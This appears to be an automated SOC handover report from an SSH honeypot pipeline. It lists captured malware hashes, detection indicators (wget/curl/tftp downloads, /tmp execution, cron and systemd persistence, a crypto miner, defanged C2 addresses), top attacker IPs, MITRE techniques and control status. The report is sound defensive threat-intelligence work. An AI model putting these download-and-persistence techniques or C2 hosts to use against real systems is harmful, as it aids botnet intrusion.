| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `27.128.240[.]75` | CN | CHINANET hebei province network | **100** ⚠️ | 50 |
| `119.96.157[.]188` | CN | CHINANET Hubei province network | **100** ⚠️ | 50 |
| `66.132.186[.]176` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `64.227.90[.]185` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `45.148.10[.]121` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `80.94.92[.]179` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `2.57.122[.]238` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `102.88.137[.]80` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `193.32.162[.]15` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |
| `143.198.208[.]150` | SG | DigitalOcean, LLC | **100** ⚠️ | 30 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 270 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 239 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 116 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 64 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 56 |

---

## 🔕 False Positive Summary (91 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 19 |
| AbuseIPDB score 1 below threshold 25 | 7 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 6 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 8 |
| AbuseIPDB score 16 below threshold 25 | 4 |
| AbuseIPDB score 17 below threshold 25 | 5 |
| AbuseIPDB score 20 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 5 |
| AbuseIPDB score 23 below threshold 25 | 5 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 22 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 456 cases |
| Tool 34  | Credential Extractor        | ✅ 3397 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 29 fingerprints |
| Tool 36  | Command Clustering          | ✅ 70 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 248 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 91 filtered (20.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 128 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 223 priority case(s) shown individually · 130 recon entry/entries in table (8 group(s) consolidating 20 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-04T19:03:10Z_
